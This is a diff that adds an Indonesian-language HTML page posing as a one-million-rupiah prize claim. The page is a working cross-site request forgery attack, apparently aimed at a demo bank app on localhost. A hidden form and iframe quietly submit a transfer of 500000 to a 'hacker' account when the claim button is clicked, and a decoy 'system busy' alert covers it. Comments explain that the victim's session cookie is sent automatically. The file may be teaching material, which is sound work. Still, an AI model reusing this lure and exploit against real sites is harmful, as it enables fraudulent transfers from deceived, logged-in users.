@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah 1 JUTA Rupiah!</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #ffeaea; }
+        .box { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; }
+        button { background-color: #ff9800; color: white; padding: 15px 30px; font-size: 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #e68a00; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎉 SELAMAT! ANDA TERPILIH! 🎉</h1>
+        <p>Anda mendapatkan hadiah Rp 1.000.000 dari undian berhadiah.</p>
+        <p>Klik tombol di bawah ini untuk mengklaim hadiah Anda sekarang sebelum hangus!</p>
+        
+        <!-- Form Tersembunyi untuk Eksploitasi CSRF -->
+        <!-- Form ini akan mengirimkan POST request ke Bank Korban. -->
+        <!-- Jika korban sedang login di bank, browser akan menyisipkan cookie session korban secara otomatis! -->
+        <form id="csrf-form" action="http://localhost:5000/transfer" method="POST" target="hidden-iframe" class="hidden">
+            <input type="hidden" name="targetUser" value="hacker">
+            <input type="hidden" name="amount" value="500000">
+        </form>
+        
+        <!-- Iframe tersembunyi agar tidak pindah halaman saat form disubmit -->
+        <iframe name="hidden-iframe" class="hidden"></iframe>
+
+        <button onclick="stealMoney()">KLAIM HADIAH 1 JUTA!</button>
+    </div>
+
+    <script>
+        function stealMoney() {
+            // Submit form secara diam-diam
+            document.getElementById('csrf-form').submit();
+            alert("Maaf, sistem sedang sibuk. Coba lagi nanti! 😈");
+        }
+    </script>
+</body>
+</html>
